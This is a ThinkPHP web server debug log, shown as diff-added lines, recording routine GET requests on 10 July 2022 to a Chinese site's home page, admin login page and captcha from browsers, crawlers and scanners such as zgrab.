+[运行时间：0.015704s] [吞吐率：63.68req/s] [内存消耗：2,099.68kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-forwarded-for' => '62.234.118.118',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone os 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/11D257 Safari/604.1',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T19:39:20+08:00 ] 62.234.118.118 GET hnqt.0898yzzx.com/admin/login/index.html
+[运行时间：0.020278s] [吞吐率：49.31req/s] [内存消耗：2,994.10kb] [文件加载：116]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-forwarded-for' => '62.234.118.118',
+  'upgrade-insecure-requests' => '1',
+  'referer' => 'https://hnqt.0898yzzx.com',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone os 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/11D257 Safari/604.1',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/hnqt.0898yzzx.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /www/wwwroot/hnqt.0898yzzx.com/tpl/admin/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T19:39:21+08:00 ] 119.147.3.95 GET hnqt.0898yzzx.com/captcha.html
+[运行时间：0.012542s] [吞吐率：79.73req/s] [内存消耗：1,773.02kb] [文件加载：99]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-from-cdn' => 'xinan',
+  'accept' => '*/*',
+  'host' => 'hnqt.0898yzzx.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /www/wwwroot/hnqt.0898yzzx.com/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T20:23:51+08:00 ] 184.105.139.68 GET 62.234.118.118/
+[运行时间：0.014122s] [吞吐率：70.81req/s] [内存消耗：2,094.13kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T20:41:09+08:00 ] 184.105.139.68 GET 62.234.118.118/
+[运行时间：0.015862s] [吞吐率：63.04req/s] [内存消耗：2,094.80kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T20:41:10+08:00 ] 184.105.139.68 GET 62.234.118.118/admin/login/index.html
+[运行时间：0.019494s] [吞吐率：51.30req/s] [内存消耗：2,986.98kb] [文件加载：116]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'referer' => 'https://62.234.118.118/',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/hnqt.0898yzzx.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /www/wwwroot/hnqt.0898yzzx.com/tpl/admin/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T21:21:48+08:00 ] 185.7.214.104 GET 62.234.118.118:443/
+[运行时间：0.014457s] [吞吐率：69.17req/s] [内存消耗：2,095.60kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T21:22:55+08:00 ] 157.55.39.188 GET www.0898yzzx.com/
+[运行时间：0.014224s] [吞吐率：70.30req/s] [内存消耗：2,097.77kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'cache-control' => 'no-cache',
+  'host' => 'www.0898yzzx.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T22:28:44+08:00 ] 34.140.248.32 GET 62.234.118.118/
+[运行时间：0.022667s] [吞吐率：44.12req/s] [内存消耗：2,097.92kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-datadog-sampling-priority' => '1',
+  'x-datadog-parent-id' => '4376147138282933628',
+  'x-datadog-trace-id' => '5133859715959466620',
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.28.1',
+  'host' => '62.234.118.118',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T22:34:12+08:00 ] 154.209.125.59 GET 62.234.118.118:443/
+[运行时间：0.014952s] [吞吐率：66.88req/s] [内存消耗：2,095.30kb] [文件加载：111]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2022-07-10T22:34:13+08:00 ] 154.209.125.59 GET 62.234.118.118:443/admin/login/index.html
+[运行时间：0.020698s] [吞吐率：48.31req/s] [内存消耗：2,987.03kb] [文件加载：116]
+[ info ] [ LANG ] /www/wwwroot/hnqt.0898yzzx.com/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '62.234.118.118:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/hnqt.0898yzzx.com/application/admin/controller/Login.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ VIEW ] /www/wwwroot/hnqt.0898yzzx.com/tpl/admin/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
